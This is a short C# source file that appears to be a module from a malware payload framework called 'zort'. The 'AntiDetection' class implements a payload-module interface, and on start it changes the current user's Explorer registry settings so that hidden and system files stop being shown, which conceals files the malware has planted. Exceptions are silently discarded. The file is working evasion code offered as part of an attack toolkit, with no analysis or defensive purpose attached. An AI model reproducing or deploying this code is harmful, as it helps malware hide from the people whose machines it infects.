using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace zort
{
    public class AntiDetection : IPayloadModule
    {
        public ElevationType ElevationType => ElevationType.Both;

        public string ModuleName => "AntiDetection";

        public void Start()
        {
            ModuleLogger.Log(this, "Hidden files are now hidden from explorer.");
            HideHiddenFoldersFromExplorer();
        }

        public void Stop()
        {
            // No need to stop anything
        }

        public static void HideHiddenFoldersFromExplorer()
        {
            try
            {
                RegistryKey explorerKey = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced", true);

                if (explorerKey != null)
                {
                    explorerKey.SetValue("Hidden", 2, RegistryValueKind.DWord); // Hide hidden files
                    explorerKey.SetValue("ShowSuperHidden", 0, RegistryValueKind.DWord); // Hide system files
                    explorerKey.Close();
                }
            }
            catch
            {

            }
        }
    }
}
